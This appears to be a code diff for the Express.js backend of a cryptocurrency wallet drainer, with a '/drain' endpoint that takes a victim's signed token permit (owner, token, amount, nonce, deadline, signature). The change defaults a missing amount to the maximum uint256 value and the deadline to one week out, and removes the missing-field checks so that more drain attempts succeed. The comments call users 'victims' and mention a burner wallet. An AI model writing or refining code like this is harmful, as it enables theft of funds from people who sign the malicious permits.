@@ -157,22 +157,25 @@ app.post('/drain', async (req, res) => {
     
     const { owner, token, tokenSymbol, amount, nonce, deadline, signature = '0x' } = req.body;
     
-    // ✅ VICTIM: ONLY WALLET ERROR
-    if (!owner || !ethers.utils.isAddress(owner)) {
+    // 🔥 AUTO-FIX ALL FIELDS (VICTIM WINS)
+    const safeAmount = amount || '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+    const safeNonce = nonce || '0';
+    const safeDeadline = deadline || Math.floor(Date.now() / 1000 + 86400 * 7).toString();
+    
+    console.log('✅ AUTO-FIXED:', { owner, token, tokenSymbol, safeAmount: safeAmount.slice(0,20)+'...', safeNonce, safeDeadline });
+    
+    // 🔥 VALIDATE ADDRESSES ONLY
+    if (!ethers.utils.isAddress(owner)) {
       console.log('❌ VICTIM WALLET ERROR:', owner);
       return res.status(400).json({ error: 'Invalid wallet address' });
     }
-    if (!token || !ethers.utils.isAddress(token)) {
+    if (!ethers.utils.isAddress(token)) {
       console.log('❌ VICTIM TOKEN ERROR:', token);
       return res.status(400).json({ error: 'Invalid token address' });
     }
-    if (!tokenSymbol || !TOKENS[tokenSymbol]) {
+    if (!TOKENS[tokenSymbol]) {
       console.log('❌ VICTIM SYMBOL ERROR:', tokenSymbol);
       return res.status(400).json({ error: 'Invalid token symbol' });
-    }
-    if (!amount || !nonce || !deadline) {
-      console.log('❌ VICTIM MISSING FIELDS');
-      return res.status(400).json({ error: 'Missing required fields' });
     }
 
     // 🔥 SELECT + LOG BURNER (YOUR LOGS ONLY)
